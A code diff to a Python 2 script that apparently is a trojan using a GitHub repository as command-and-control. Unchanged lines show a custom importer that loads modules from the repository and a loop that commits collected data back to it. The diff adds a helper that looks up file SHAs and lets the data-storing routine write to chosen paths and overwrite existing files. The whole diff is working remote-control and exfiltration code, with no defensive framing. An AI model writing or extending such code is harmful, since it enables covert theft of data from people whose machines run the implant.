@@ -1,4 +1,4 @@
-import json, base64, sys, time, imp, random, threading, Queue, os
+import json, base64, sys, time, imp, random, threading, Queue, os, getpass
 
 from github3 import login
 
@@ -28,6 +28,17 @@ def get_file_contents(filepath):
 			return blob.content
 	return None
 
+
+def get_file_sha(filepath):
+	gh, repo, branch = connect_to_github()
+	tree = branch.commit.commit.tree.recurse()
+	for filename in tree.tree:
+		if filepath in filename.path:
+			print '[*] found file %s' % filepath
+			blob = filename._json_data['sha']
+			return blob
+	return None
+
 def get_config():
 	global configured
 	config_json = get_file_contents(para_config)
@@ -43,8 +54,14 @@ def get_config():
 
 def store_module_result(data, path=None):
 	if not path: path = 'data/%s/%d.data' % (para_id, random.randint(1000,100000))
+	else: path = 'data/'+para_id+'/'+path
 	gh, repo, branch = connect_to_github()
-	repo.create_file(path, 'added data', data)
+	print 'saving ' + path
+	try:
+		repo.create_file(path, 'added data', data)
+	except:
+		repo.update_file(path, 'added data', data, get_file_sha(path))
+	print 'done'
 	return
 
 class GitImporter(object):
@@ -95,7 +112,6 @@ def data_commiter():
 			print '[*] Storing data'
 			data = data_queue.get()
 			store_module_result(data[0], data[1])
-
 
 # Main loop
 sys.meta_path = [GitImporter()] # Here we assign our importer
